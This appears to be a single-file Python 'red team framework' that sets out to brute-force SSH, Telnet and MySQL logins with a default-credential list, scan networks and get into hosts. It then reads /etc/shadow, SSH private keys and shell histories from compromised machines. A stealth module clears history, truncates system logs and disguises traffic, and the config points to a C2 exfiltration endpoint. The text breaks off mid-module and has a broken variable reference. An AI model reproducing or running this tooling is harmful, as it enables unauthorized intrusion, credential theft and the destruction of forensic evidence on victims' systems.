#!/usr/bin/env python3
"""
COMPREHENSIVE RED TEAM FRAMEWORK - ALL-IN-ONE VERSION
Full penetration testing framework with all modules integrated into a single file.

Authors: f1cu Independent Red Team Consultant
Classification: Professional Use Only
⚠️ WARNING: For authorized penetration testing only.
"""

import asyncio
import json
import logging
import argparse
import os
import sys
import time
import re
import base64
import hashlib
import socket
import subprocess
import threading
import random
import warnings
import ipaddress
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple, Set, DefaultDict, Union
from collections import defaultdict, deque
from pathlib import Path

# Try to import optional libraries with graceful fallback
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False
    warnings.warn("PyYAML not installed. Using default config values.")

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    warnings.warn("Paramiko not installed. SSH functionality will be limited.")

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    warnings.warn("Scapy not installed. Network scanning will be limited.")

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    warnings.warn("aiohttp not installed. Web interactions will be limited.")

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False
    warnings.warn("NumPy not installed. ML features will be limited.")

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False
    warnings.warn("cryptography not installed. Data encryption will be disabled.")

# DEFAULT CONFIGURATION (embedded as Python dict since we can't rely on external YAML file)
DEFAULT_CONFIG = {
    'general': {
        'verbose': True,
        'log_level': "INFO",
        'output_dir': "./reports",
        'temp_dir': "/tmp",
        'max_concurrent_scans': 10,
        'request_delay': 0.5,
        'timeout': 10
    },
    'stealth': {
        'level': "high",  # 'low', 'medium', 'high'
        'use_proxy': False,
        'proxy_url': "socks5://127.0.0.1:9050",
        'mimic_user_agent': True,
        'random_delay_range': [0.2, 1.0],
        'rotate_ip_on_new_scan': False,
        'interface': "wlan0"
    },
    'exfiltration': {
        'c2_url': "http://127.0.0.1:8080/exfiltrate",
        'encryption_key': "your-32-byte-encryption-key-here-32bytes!!",
        'method': "https",  # 'https', 'dns', 'icmp', 'email'
        'proxy_url': None
    },
    'ml': {
        'window_size': 100,
        'model_path': "./models/behavior_model.pkl",
        'learning_rate': 0.1,
        'stealth_threshold': 0.8,
        'adaptation_frequency': 10
    },
    'brute_force': {
        'wordlist': "./wordlists/common_creds.txt",
        'max_concurrent': 10,
        'delay_between_attempts': 1.0,
        'max_attempts_per_service': 50
    },
    'c2_server': {
        'host': "0.0.0.0",
        'port': 8080,
        'encryption_key': "your-32-byte-encryption-key-here-32bytes!!"
    },
    'advanced_network_attacks': {
        'mitm': {
            'arp_interval': 2.0,
            'restore_on_exit': True
        },
        'credential_hijacker': {
            'interface': "wlan0"
        },
        'memory_executor': {
            'cleanup_temp_files': True
        }
    },
    'scanning': {
        'nmap_args': "-sn --host-timeout 300s",
        'ping_sweep': True,
        'arp_scan': True,
        'port_scan_range': "1-1024,8080,8443,3389,5900"
    },
    'mobile_iot': {
        'adb_path': "/usr/bin/adb",
        'scan_iot_networks': True,
        'iot_scan_ports': [23, 22, 80, 443, 554, 1883, 5683]
    },
    'reporting': {
        'generate_json': True,
        'generate_pdf': False,
        'include_sensitive_data': False,
        'report_filename_prefix': "pentest_report"
    }
}

# DEFAULT CREDENTIALS (embedded for fallback when wordlist not available)
DEFAULT_CREDENTIALS = [
    {'username': 'admin', 'password': 'admin'},
    {'username': 'root', 'password': 'root'},
    {'username': 'root', 'password': 'password'},
    {'username': 'user', 'password': 'user'},
    {'username': 'guest', 'password': 'guest'},
    {'username': 'pi', 'password': 'raspberry'},
    {'username': 'test', 'password': 'test'},
    {'username': 'ubuntu', 'password': 'ubuntu'},
    {'username': 'oracle', 'password': 'oracle'},
    {'username': 'postgres', 'password': 'postgres'},
    {'username': 'mysql', 'password': 'mysql'},
    {'username': 'cisco', 'password': 'cisco'},
    {'username': 'enable', 'password': 'enable'},
    {'username': 'service', 'password': 'service'},
    {'username': 'backup', 'password': 'backup'}
]

# Configure logging
def setup_logging(verbose: bool = True, log_level: str = "INFO"):
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)
    log_file = log_dir / f"pentest_framework_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    
    level = getattr(logging, log_level.upper(), logging.INFO)
    
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout) if verbose else logging.NullHandler()
        ]
    )
    return logging.getLogger('ComprehensiveFramework')

logger = setup_logging()

# ==============================================================================
# BEGIN MODULE: Stealth Techniques
# ==============================================================================

class StealthTechniques:
    """
    Handles evasion, mimicry, and cleanup for operations.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize stealth techniques with configuration.
        Example config:
        {
            'use_proxy': True,
            'proxy_url': 'socks5://127.0.0.1:9050',
            'mimic_user_agent': True,
            'request_delay': 1.0,
            'random_delay_range': [0.5, 2.0],
            'stealth_level': 'high'  # 'low', 'medium', 'high'
        }
        """
        self.config = config
        self.use_proxy = config.get('use_proxy', False)
        self.proxy_url = config.get('proxy_url', None)
        self.mimic_user_agent = config.get('mimic_user_agent', True)
        self.request_delay = config.get('request_delay', 1.0)
        self.random_delay_range = config.get('random_delay_range', [0.5, 2.0])
        self.stealth_level = config.get('stealth_level', 'medium')
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        self.normal_urls = [
            "https://www.google.com",
            "https://www.youtube.com",
            "https://www.facebook.com",
            "https://www.amazon.com",
            "https://www.wikipedia.org"
        ]

    def get_stealth_headers(self) -> Dict[str, str]:
        """Get headers that mimic normal browser behavior."""
        headers = {}
        if self.mimic_user_agent:
            headers['User-Agent'] = random.choice(self.user_agents)
        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        headers['Accept-Language'] = 'en-US,en;q=0.5'
        headers['Accept-Encoding'] = 'gzip, deflate'
        headers['Connection'] = 'keep-alive'
        headers['Upgrade-Insecure-Requests'] = '1'
        return headers

    async def apply_request_delay(self):
        """Apply configured delay between requests."""
        if self.stealth_level == 'high':
            # Use random delay in range
            delay = random.uniform(*self.random_delay_range)
        elif self.stealth_level == 'medium':
            # Use fixed delay
            delay = self.request_delay
        else:
            # Low stealth - minimal delay
            delay = max(0.1, self.request_delay / 10)
        
        await asyncio.sleep(delay)

    def setup_proxy_session(self):
        """Setup proxy for requests (if configured)."""
        if self.use_proxy and self.proxy_url:
            os.environ['http_proxy'] = self.proxy_url
            os.environ['https_proxy'] = self.proxy_url
            logger.info(f"Proxy configured: {self.proxy_url}")
        else:
            logger.info("No proxy configured.")

    def mimic_normal_behavior(self, target_url: str):
        """
        Mimic normal user behavior by accessing legitimate sites
        before or after the target operation.
        """
        if self.stealth_level in ['medium', 'high']:
            # Access a few normal URLs to blend in
            for url in random.sample(self.normal_urls, 2):
                try:
                    subprocess.run(['curl', '-s', '-A', random.choice(self.user_agents), url], 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                except:
                    pass  # Ignore errors, just for camouflage

    def clean_artifacts(self, target_info: Dict[str, Any]):
        """
        Clean up traces of operations on the target system.
        This should be called after operations are complete.
        """
        logger.info("Starting cleanup of artifacts...")
        
        # 1. Clear command history
        try:
            subprocess.run(['history', '-c'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['rm', '-f', '/tmp/*'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass  # May not work if not on target system

        # 2. Clear logs (if access allows)
        log_cleanup_commands = [
            r'find /var/log -name "*.log" -exec truncate -s 0 {} \; 2>/dev/null',
            'find /var/log -name "*.tmp" -delete 2>/dev/null',
            'find /var/log -name "*.old" -delete 2>/dev/null'
        ]
        for cmd in log_cleanup_commands:
            try:
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

        # 3. Remove temporary files created by framework
        temp_files = target_info.get('temp_files', [])
        for temp_file in temp_files:
            try:
                os.remove(temp_file)
                logger.debug(f"Removed temporary file: {temp_file}")
            except:
                pass

        # 4. Clear DNS cache (system-specific)
        try:
            if os.name == 'posix':  # Linux/Mac
                subprocess.run(['sudo', 'systemd-resolve', '--flush-caches'], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        logger.info("Cleanup completed.")

    def randomize_packet_ttl(self) -> int:
        """Randomize TTL to mimic different OS fingerprints."""
        if self.stealth_level == 'high':
            # Use TTLs that are common for different OS
            ttls = [64, 128, 255]  # Linux, Windows, Some Unix
            return random.choice(ttls)
        else:
            return 64  # Standard Linux TTL

    def obfuscate_payload(self, payload: str) -> str:
        """Apply basic obfuscation to payloads."""
        if self.stealth_level == 'high':
            # Simple character substitution
            obfuscation_map = {
                "'": "''",  # Double single quote
                '"': '""',  # Double double quote
                ' ': '/**/',  # SQL comment space replacement
                '=': '%3D',  # URL encoding
            }
            obfuscated = payload
            for char, replacement in obfuscation_map.items():
                obfuscated = obfuscated.replace(char, replacement)
            return obfuscated
        return payload

    def check_anti_forensics(self) -> bool:
        """
        Check if anti-forensics techniques should be applied.
        Based on stealth level and target sensitivity.
        """
        return self.stealth_level == 'high'

    def set_low_priority(self):
        """Set process priority to low to avoid detection by performance monitors."""
        try:
            import psutil
            p = psutil.Process()
            if os.name == 'posix':
                p.nice(19)  # Lowest priority on Unix
            logger.debug("Process priority set to low.")
        except ImportError:
            logger.warning("psutil not available, skipping priority adjustment.")

    def rotate_ip_if_possible(self):
        """
        Rotate IP address if using a service that supports it (e.g., Tor).
        This is a placeholder - real implementation depends on network setup.
        """
        if self.proxy_url and 'tor' in self.proxy_url.lower():
            try:
                # Signal Tor to get a new circuit
                subprocess.run(['tor', '--hash-password', 'newnym'], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                logger.info("Requested new Tor circuit.")
            except:
                logger.warning("Could not request new Tor circuit.")

    def apply_evasion_techniques(self, url: str) -> Dict[str, Any]:
        """
        Apply all configured evasion techniques to a request.
        Returns a config dict for use with aiohttp/requests.
        """
        config = {
            'headers': self.get_stealth_headers(),
            'delay': self.request_delay,
            'proxy': self.proxy_url if self.use_proxy else None,
            'ttl': self.randomize_packet_ttl()
        }
        
        # Mimic normal behavior before target request
        self.mimic_normal_behavior(url)
        
        return config

    async def wait_random_time(self, min_time: float = 0.5, max_time: float = 2.0):
        """Wait for a random amount of time to avoid timing-based detection."""
        wait_time = random.uniform(min_time, max_time)
        await asyncio.sleep(wait_time)

    def cleanup_temp_files(self, temp_dir: str = "/tmp"):
        """Clean up temporary files created during operation."""
        try:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if 'pentest' in file or 'redteam' in file:
                        file_path = os.path.join(root, file)
                        os.remove(file_path)
                        logger.debug(f"Removed temp file: {file_path}")
        except Exception as e:
            logger.warning(f"Could not clean temp files: {e}")

# ==============================================================================
# BEGIN MODULE: Exploitation Engine
# ==============================================================================

class ExploitationEngine:
    """
    Handles network scanning, vulnerability assessment, and initial access.
    """
    
    def __init__(self, wordlist_path: Optional[str] = None):
        self.credentials = self.load_credentials(wordlist_path)
        self.time_delay = 0.5
        self.stealth_mode = True

    def load_credentials(self, wordlist_path: Optional[str] = None) -> List[Dict[str, str]]:
        """Load credentials from wordlist file."""
        if wordlist_path and os.path.exists(wordlist_path):
            try:
                with open(wordlist_path, 'r') as f:
                    creds = []
                    for line in f:
                        line = line.strip()
                        if ':' in line:
                            user, pwd = line.split(':', 1)
                            creds.append({'username': user, 'password': pwd})
                    return creds
            except Exception as e:
                logger.error(f"Error loading credentials from {wordlist_path}: {e}")
        
        # Return default credentials if file not found or error
        return DEFAULT_CREDENTIALS

    async def discover_devices(self, network_range: str) -> List[Dict[str, Any]]:
        """Discover devices on the network using multiple techniques."""
        devices = []
        logger.info(f"Discovering devices on network: {network_range}")

        # 1. ARP Scan (most reliable for local networks)
        devices.extend(self._arp_scan(network_range))

        # 2. Ping Scan (fallback)
        devices.extend(self._ping_scan(network_range, devices))

        # 3. nmap scan (if available)
        devices.extend(self._nmap_scan(network_range, devices))

        # Remove duplicates based on IP
        unique_devices = []
        seen_ips = set()
        for device in devices:
            if device['ip'] not in seen_ips:
                unique_devices.append(device)
                seen_ips.add(device['ip'])

        logger.info(f"Discovered {len(unique_devices)} unique devices.")
        return unique_devices

    def _arp_scan(self, network_range: str) -> List[Dict[str, Any]]:
        """Perform ARP scan using scapy."""
        devices = []
        if not SCAPY_AVAILABLE:
            logger.warning("Scapy not available, skipping ARP scan.")
            return devices
            
        try:
            arp_request = scapy.ARP(pdst=network_range)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

            for element in answered_list:
                ip = element[1].psrc
                mac = element[1].hwsrc
                vendor = self._get_vendor_from_mac(mac)
                devices.append({
                    'ip': ip,
                    'mac': mac,
                    'vendor': vendor,
                    'status': 'Up',
                    'discovered_via': 'arp'
                })
        except Exception as e:
            logger.error(f"ARP scan failed: {e}")
        return devices

    def _ping_scan(self, network_range: str, existing_devices: List[Dict]) -> List[Dict[str, Any]]:
        """Simple ping scan as fallback."""
        devices = []
        existing_ips = {d['ip'] for d in existing_devices}
        try:
            network = ipaddress.IPv4Network(network_range, strict=False)
            timeout = 3 if not self.stealth_mode else 1
            count = 1 if not self.stealth_mode else 1

            for ip in network.hosts():
                ip_str = str(ip)
                if ip_str in existing_ips:
                    continue
                try:
                    response = subprocess.run(['ping', '-c', str(count), '-W', str(timeout), ip_str],
                                              capture_output=True, timeout=timeout+1)
                    if response.returncode == 0:
                        devices.append({
                            'ip': ip_str,
                            'status': 'Up',
                            'discovered_via': 'ping'
                        })
                except:
                    continue
        except Exception:
            pass
        return devices

    def _nmap_scan(self, network_range: str, existing_devices: List[Dict]) -> List[Dict[str, Any]]:
        """Use nmap for detailed host discovery if available."""
        devices = []
        existing_ips = {d['ip'] for d in existing_devices}
        try:
            result = subprocess.run(['nmap', '-sn', '--host-timeout', '300s', network_range],
                                    capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                # Parse nmap output for IP and MAC
                for line in result.stdout.splitlines():
                    if 'Nmap scan report for' in line:
                        ip_match = re.search(r'Nmap scan report for ([\d.]+)', line)
                        if ip_match:
                            ip_str = ip_match.group(1)
                            if ip_str not in existing_ips:
                                devices.append({
                                    'ip': ip_str,
                                    'status': 'Up',
                                    'discovered_via': 'nmap'
                                })
        except FileNotFoundError:
            logger.warning("nmap not found, skipping detailed scan.")
        except Exception as e:
            logger.error(f"nmap scan failed: {e}")
        return devices

    def _get_vendor_from_mac(self, mac: str) -> str:
        """Get device vendor from MAC address."""
        mac_prefix = mac.replace(':', '').upper()[:6]
        vendors = {
            '00:1A:2B': 'Cisco',
            '00:14:BF': 'Samsung',
            '00:22:FB': 'Apple',
            '00:1C:B3': 'Intel',
            '00:24:E8': 'TP-Link',
            '00:1A:79': 'Netgear',
            '00:0F:CC': 'D-Link',
            '00:1A:2B': 'Huawei',
            '00:21:CC': 'Xiaomi',
            '00:1A:4D': 'Samsung',
            '00:1A:79': 'Asus',
            '00:1A:2B': 'Huawei',
            '00:21:CC': 'Xiaomi',
            '00:1A:4D': 'Samsung',
            '00:1A:79': 'Asus',
            'B8:27:EB': 'Raspberry Pi',
            'DC:A6:32': 'Android',
            '70:85:C2': 'Nintendo',
            'E0:CB:4E': 'PlayStation'
        }
        for prefix, vendor in vendors.items():
            if mac_prefix.startswith(prefix.replace(':', '').upper()):
                return vendor
        return 'Unknown'

    async def scan_ports(self, device_ip: str, ports: Optional[List[int]] = None) -> Dict[str, Any]:
        """Scan ports on a specific device."""
        if ports is None:
            # Common ports to scan
            ports = list(range(1, 1025)) # System ports
            ports.extend([8080, 8443, 3389, 5900, 27017, 5432, 3306]) # Additional common ports

        open_ports = []
        vulnerable_ports = []
        service_info = {}
        timeout = 0.5 if self.stealth_mode else 0.1

        logger.info(f"Scanning {len(ports)} ports on {device_ip} (stealth: {self.stealth_mode})")

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((device_ip, port))
                if result == 0:
                    open_ports.append(port)
                    service = self._identify_service(port)
                    service_info[port] = service
                    # Check if port is vulnerable
                    if self._check_port_vulnerability(port):
                        vulnerable_ports.append(port)
                # Opóźnienie w trybie stealth
                if self.stealth_mode:
                    await asyncio.sleep(0.01)
            except:
                pass
            finally:
                sock.close()

        return {
            'open_ports': open_ports,
            'vulnerable_ports': vulnerable_ports,
            'service_info': service_info,
            'total_ports_scanned': len(ports)
        }

    def _identify_service(self, port: int) -> str:
        """Identify service based on port number."""
        services = {
            20: 'FTP (Data)',
            21: 'FTP (Control)',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            135: 'RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            1433: 'MSSQL',
            1521: 'Oracle DB',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6379: 'Redis',
            9200: 'Elasticsearch',
            27017: 'MongoDB',
            8080: 'HTTP Alternate',
            8443: 'HTTPS Alternate'
        }
        return services.get(port, f'Unknown ({port})')

    def _check_port_vulnerability(self, port: int) -> bool:
        """Check if given port is potentially vulnerable."""
        vulnerable_ports = {
            21: 'FTP - Potential config issues',
            22: 'SSH - Possible weak passwords',
            23: 'Telnet - Unencrypted communication',
            25: 'SMTP - Potential config issues',
            110: 'POP3 - Unencrypted communication',
            143: 'IMAP - Potential config issues',
            445: 'SMB - EternalBlue, etc.',
            1433: 'MSSQL - Potential weak auth',
            3306: 'MySQL - Potential weak auth',
            3389: 'RDP - Potential weak auth',
            5900: 'VNC - Potential weak auth',
            6379: 'Redis - Unprotected instance',
            9200: 'Elasticsearch - Potential misconfig',
            27017: 'MongoDB - Potential misconfig'
        }
        return port in vulnerable_ports

    async def assess_vulnerabilities(self, device: Dict[str, Any]) -> Dict[str, Any]:
        """Assess vulnerabilities on a specific device."""
        vulnerabilities = {}
        ip = device['ip']
        port_scan = device.get('port_scan', {})

        open_ports = port_scan.get('open_ports', [])
        service_info = port_scan.get('service_info', {})

        # Check for common vulnerabilities based on open ports
        if 21 in open_ports:
            vulnerabilities['ftp_anonymous_access'] = self._check_ftp_anonymous(ip)
        if 22 in open_ports:
            vulnerabilities['ssh_weak_auth'] = await self._check_ssh_weak_auth(ip)
        if 80 in open_ports or 443 in open_ports:
            vulnerabilities['web_vulns'] = await self._check_web_vulns(ip)
        if 445 in open_ports:
            vulnerabilities['smb_vulns'] = self._check_smb_vulns(ip)
        if 3306 in open_ports:
            vulnerabilities['mysql_vulns'] = self._check_mysql_vulns(ip)

        return vulnerabilities

    def _check_ftp_anonymous(self, ip: str) -> bool:
        """Check for anonymous FTP access."""
        if not PARAMIKO_AVAILABLE:
            logger.warning("Paramiko not available, skipping FTP check.")
            return False
            
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(ip, 21, timeout=5)
            ftp.login()  # Anonymous login
            ftp.quit()
            return True
        except:
            return False

    async def _check_ssh_weak_auth(self, ip: str) -> bool:
        """Check for weak SSH authentication."""
        if not PARAMIKO_AVAILABLE:
            logger.warning("Paramiko not available, skipping SSH check.")
            return False
            
        for cred in self.credentials:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=22, username=cred['username'], password=cred['password'], timeout=5)
                client.close()
                logger.info(f"Weak SSH auth found on {ip} with {cred['username']}:{cred['password']}")
                return True
            except:
                continue
        return False

    async def _check_web_vulns(self, ip: str) -> Dict[str, bool]:
        """Check for common web vulnerabilities."""
        if not AIOHTTP_AVAILABLE:
            logger.warning("aiohttp not available, skipping web vuln check.")
            return {}
            
        vulns = {}
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                for port in [80, 443, 8080, 8443]:
                    if port in [80, 8080]:
                        url = f"http://{ip}:{port}"
                    else:
                        url = f"https://{ip}:{port}"
                    try:
                        async with session.get(url) as resp:
                            content = await resp.text()
                            # Check for common signs
                            if 'phpinfo()' in content or 'X-Powered-By' in str(resp.headers):
                                vulns[f'php_info_on_{port}'] = True
                            if 'admin' in content.lower() and 'login' in content.lower():
                                vulns[f'admin_panel_on_{port}'] = True
                            break
                    except:
                        continue
        except ImportError:
            logger.warning("aiohttp not available, skipping web vuln check.")
        return vulns

    def _check_smb_vulns(self, ip: str) -> bool:
        """Check for common SMB vulnerabilities."""
        try:
            import smbclient
            # Example: Check for null session or anonymous access
            smbclient.ClientConfig(username='', password='')
            shares = smbclient.list_shares(f"\\\\{ip}")
            return len(shares) > 0  # If any shares are accessible
        except:
            return False

    def _check_mysql_vulns(self, ip: str) -> bool:
        """Check for MySQL vulnerabilities."""
        try:
            import mysql.connector
            for cred in self.credentials:
                try:
                    conn = mysql.connector.connect(
                        host=ip,
                        port=3306,
                        user=cred['username'],
                        password=cred['password'],
                        connection_timeout=5
                    )
                    conn.close()
                    logger.info(f"Weak MySQL auth found on {ip} with {cred['username']}")
                    return True
                except:
                    continue
        except ImportError:
            logger.warning("mysql-connector not available, skipping MySQL check.")
        return False

    async def gain_initial_access(self, device: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt to gain initial access to the device."""
        access_methods = []
        ip = device['ip']
        port_scan = device.get('port_scan', {})

        open_ports = port_scan.get('open_ports', [])

        # Try SSH
        if 22 in open_ports:
            success, cred = await self._attempt_ssh_access(ip)
            if success:
                access_methods.append({
                    'service': 'ssh',
                    'ip': ip,
                    'port': 22,
                    'username': cred['username'],
                    'password': cred['password'],
                    'method': 'brute_force'
                })

        # Try Telnet
        if 23 in open_ports:
            success, cred = await self._attempt_telnet_access(ip)
            if success:
                access_methods.append({
                    'service': 'telnet',
                    'ip': ip,
                    'port': 23,
                    'username': cred['username'],
                    'password': cred['password'],
                    'method': 'brute_force'
                })

        # Try FTP anonymous
        if 21 in open_ports:
            if self._check_ftp_anonymous(ip):
                access_methods.append({
                    'service': 'ftp',
                    'ip': ip,
                    'port': 21,
                    'username': 'anonymous',
                    'password': '',
                    'method': 'anonymous'
                })

        return {
            'success': len(access_methods) > 0,
            'access_methods': access_methods
        }

    async def _attempt_ssh_access(self, ip: str) -> tuple[bool, Optional[Dict[str, str]]]:
        """Attempt to access via SSH using credentials."""
        if not PARAMIKO_AVAILABLE:
            logger.warning("Paramiko not available, skipping SSH access attempt.")
            return False, None
            
        for cred in self.credentials:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=22, username=cred['username'], password=cred['password'], timeout=5)
                client.close()
                logger.info(f"SSH access gained on {ip} with {cred['username']}")
                return True, cred
            except:
                continue
        return False, None

    async def _attempt_telnet_access(self, ip: str) -> tuple[bool, Optional[Dict[str, str]]]:
        """Attempt to access via Telnet using credentials."""
        import telnetlib
        for cred in self.credentials:
            try:
                tn = telnetlib.Telnet(ip, 23, timeout=5)
                tn.read_until(b"login:", timeout=2)
                tn.write(cred['username'].encode('ascii') + b"\n")
                tn.read_until(b"Password:", timeout=2)
                tn.write(cred['password'].encode('ascii') + b"\n")
                # Simple check if login successful (can be improved)
                prompt = tn.read_very_eager()
                if b'$' in prompt or b'#' in prompt or b'>' in prompt:
                    tn.close()
                    logger.info(f"Telnet access gained on {ip} with {cred['username']}")
                    return True, cred
                tn.close()
            except:
                continue
        return False, None

    def detect_gateway(self) -> str:
        """Detect the network gateway."""
        try:
            import netifaces
            gateways = netifaces.gateways()
            default_gateway = gateways['default']
            if netifaces.AF_INET in default_gateway:
                return default_gateway[netifaces.AF_INET][0]
        except:
            pass
        return "192.168.1.1" # Default fallback

# ==============================================================================
# BEGIN MODULE: Data Extraction
# ==============================================================================

class DataExtractor:
    """
    Handles extraction of sensitive data from compromised devices.
    """
    
    def __init__(self, access_info: Dict[str, Any]):
        """
        Initialize extractor with access information.
        Example access_info:
        {
            'service': 'ssh',
            'ip': '192.168.1.10',
            'port': 22,
            'username': 'root',
            'password': 'password'
        }
        """
        self.access_info = access_info
        self.ssh_client = None
        self.connected = False
        self.extracted_data = {
            'system_info': {},
            'credentials': [],
            'files': [],
            'network_info': {},
            'processes': [],
            'sensitive_data': {}
        }

    def connect(self) -> bool:
        """Establish connection to the target device."""
        if self.access_info['service'] == 'ssh':
            if not PARAMIKO_AVAILABLE:
                logger.error("Paramiko not available, cannot connect via SSH")
                return False
                
            try:
                self.ssh_client = paramiko.SSHClient()
                self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.ssh_client.connect(
                    hostname=self.access_info['ip'],
                    port=self.access_info['port'],
                    username=self.access_info['username'],
                    password=self.access_info['password'],
                    timeout=10
                )
                self.connected = True
                logger.info(f"Successfully connected to {self.access_info['ip']} via SSH")
                return True
            except Exception as e:
                logger.error(f"SSH connection failed: {e}")
                return False
        # Add other service types (Telnet, etc.) here if needed
        return False

    def execute_command(self, command: str) -> tuple[Optional[str], Optional[str], int]:
        """
        Execute a command on the target device.
        Returns: (stdout, stderr, exit_status)
        """
        if not self.connected:
            logger.error("Not connected to target device")
            return None, None, -1

        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(command)
            stdout_str = stdout.read().decode('utf-8', errors='ignore')
            stderr_str = stderr.read().decode('utf-8', errors='ignore')
            exit_status = stdout.channel.recv_exit_status()
            return stdout_str, stderr_str, exit_status
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            return None, None, -1

    def extract_system_info(self) -> Dict[str, Any]:
        """Extract basic system information."""
        if not self.connected:
            return {}

        system_info = {}

        # OS Info
        os_info, _, _ = self.execute_command('uname -a')
        if os_info:
            system_info['os_info'] = os_info.strip()

        # Kernel version
        kernel, _, _ = self.execute_command('cat /proc/version')
        if kernel:
            system_info['kernel_version'] = kernel.strip()

        # Distribution info
        distro, _, _ = self.execute_command('cat /etc/os-release')
        if distro:
            system_info['distribution'] = distro.strip()

        # Architecture
        arch, _, _ = self.execute_command('uname -m')
        if arch:
            system_info['architecture'] = arch.strip()

        # Uptime
        uptime, _, _ = self.execute_command('uptime')
        if uptime:
            system_info['uptime'] = uptime.strip()

        # Hostname
        hostname, _, _ = self.execute_command('hostname')
        if hostname:
            system_info['hostname'] = hostname.strip()

        self.extracted_data['system_info'] = system_info
        logger.info(f"System info extracted from {self.access_info['ip']}")
        return system_info

    def extract_credentials(self) -> List[Dict[str, Any]]:
        """Extract potential credentials from common locations."""
        if not self.connected:
            return []

        credentials = []
        # Common paths to check for credentials
        credential_paths = [
            '/etc/shadow',
            '/etc/passwd',
            '/root/.ssh/id_rsa',
            '/root/.ssh/id_dsa',
            '/home/*/.ssh/id_rsa',
            '/home/*/.ssh/id_dsa',
            '/etc/mysql/my.cnf',
            '/etc/postgresql/*/*/pg_hba.conf',
            '/etc/hosts',
            '/etc/fstab',
            '/etc/network/interfaces',
            '/etc/sudoers',
            '/etc/crontab',
            '/home/*/.bash_history',
            '/root/.bash_history',
            '/home/*/.zsh_history',
            '/root/.zsh_history',
            '/etc/environment',
            '/etc/profile',
            '/etc/bash.bashrc',
            '/etc/ssh/sshd_config',
            '/etc/ssh/ssh_config',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/etc/vsftpd.conf',
            '/etc/proftpd.conf'
        ]

        for path in credential_paths:
            try:
                # Use find to get actual paths for wildcards
                if '*' in path:
                    find_cmd = f"find {path.split('*')[0]} -name '{path.split('/')[-1]}' 2>/dev/null"
                    stdout, _, _ = self.execute_command(find_cmd)
                    if stdout:
                        actual_paths = stdout.strip().split('\n')
                        for actual_path in actual_paths:
                            if actual_path:
                                cred_data = self._read_file(actual_path)
                                if cred_data:
                                    credentials.append({
                                        'path': actual_path,
                                        'content': cred_data,
                                        'type': self._infer_credential_type(actual_path)
                                    })
                else:
                    cred_data = self._read_file(path)
                    if cred_:
                        credentials.append({
                            'path': path,
                            'content': cred_data,
                            'type': self._infer_credential_type(path)
                        })
            except Exception as e:
                logger.debug(f"Error reading {path}: {e}")
                continue

        self.extracted_data['credentials'] = credentials
        logger.info(f"Found {len(credentials)} potential credential files from {self.access_info['ip']}")
        return credentials

